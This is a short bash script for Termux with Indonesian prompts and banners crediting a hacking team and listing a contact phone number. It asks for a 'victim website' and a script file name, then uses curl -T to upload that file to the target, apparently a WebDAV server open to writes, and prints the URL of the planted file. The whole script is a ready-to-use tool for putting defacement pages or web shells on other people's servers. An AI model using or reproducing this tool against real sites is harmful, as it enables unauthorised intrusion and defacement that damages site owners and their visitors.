 #!/bin/bash

'''
# Please Don't recode =(
# Hae Mastah '-' mau ngapain? 
# Author : Star'-'
'''

purple='\033[35;1m'
cyan='\033[36;1m'
white='\033[37;1m'
yellow='\033[33;1m'
red='\033[1;91m'
blue='\033[34;1m'
green='\033[32;1m'

termux-setup-storage
clear
clear
figlet -f slant "WEBDAV" | lolcat
echo ""
echo ""
echo "==============================" | lolcat
echo ""
echo "$green Created By Me : ./TuanStar"
echo "$red Contact : 0895422939836" | lolcat
echo "$purple S.A.D Cyber Team " | lolcat
echo ""
echo "==============================" | lolcat
echo ""
echo ""
read -p "Masukkan web korban  ~# " target;
read -p "Nama script lu coeg  ~# "  sc;
curl -a -T /storage/emulated/0/$sc $target
echo "Hasilnya :v |==>"  $target/$sc
